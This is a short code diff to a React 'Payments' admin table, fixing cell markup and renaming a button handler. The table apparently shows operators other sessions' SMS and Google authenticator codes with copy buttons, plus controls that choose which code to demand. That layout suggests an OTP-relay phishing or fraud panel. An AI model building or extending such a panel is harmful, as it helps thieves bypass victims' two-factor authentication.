@@ -332,9 +332,10 @@ const Payments = () => {
                                  className="font-mono text-center cursor-pointer hover:bg-gray-100 transition-colors hidden lg:table-cell"
                                  onClick={() => session.sms_code && copyToClipboard(session.sms_code, 'SMS-Code')}
                                >
-                                 {session.verification_method === 'sms_confirmation' && session.sms_code 
-                                   ? session.sms_code 
-                                   : '-'}
+                                  {session.verification_method === 'sms_confirmation' && session.sms_code 
+                                    ? session.sms_code 
+                                    : '-'}
+                                </TableCell>
                                 <TableCell 
                                   className="font-mono text-center cursor-pointer hover:bg-gray-100 transition-colors hidden lg:table-cell"
                                   onClick={() => session.google_code && copyToClipboard(session.google_code, 'Google-Code')}
@@ -343,6 +344,7 @@ const Payments = () => {
                                     ? session.google_code 
                                     : '-'}
                                 </TableCell>
+                                <TableCell className="text-center hidden sm:table-cell">
                                  {session.verification_method === 'app_confirmation' ? (
                                    <div className={`w-3 h-3 rounded-full mx-auto ${
                                      session.verification_status === 'app_confirmed' 
@@ -373,14 +375,14 @@ const Payments = () => {
                         <Button
                           size="sm"
                           variant="outline"
-                          onClick={() => setVerificationMethod(session.session_id, 'sms_confirmation')}
+                          onClick={() => handleVerificationAction(session.session_id, 'sms_confirmation')}
                         >
                           SMS
                         </Button>
                         <Button
                           size="sm"
                           variant="outline"
-                          onClick={() => setVerificationMethod(session.session_id, 'google_code_confirmation')}
+                          onClick={() => handleVerificationAction(session.session_id, 'google_code_confirmation')}
                         >
                           Code
                         </Button>
